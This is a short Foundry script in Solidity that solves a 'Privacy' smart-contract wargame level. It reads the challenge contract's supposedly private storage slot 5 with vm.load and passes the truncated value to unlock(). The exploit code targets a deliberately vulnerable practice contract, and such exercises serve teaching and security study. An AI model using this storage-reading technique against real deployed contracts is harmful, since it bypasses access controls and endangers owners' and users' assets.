// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { Privacy } from "../src/12_Privacy.sol";

contract PrivacyAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {

    HelperConfig helperConfig = new HelperConfig();
    address payable challengeInstanceAddress = payable(helperConfig.instances("Privacy"));    
    Privacy challenge = Privacy(challengeInstanceAddress);

    vm.startBroadcast(deployerPrivateKey);
    bytes32 slot_0 = vm.load(challengeInstanceAddress, bytes32(uint256(5)));
    challenge.unlock(bytes16(slot_0));

    console.log("Locked: %s", challenge.locked());

    vm.stopBroadcast();
  }

}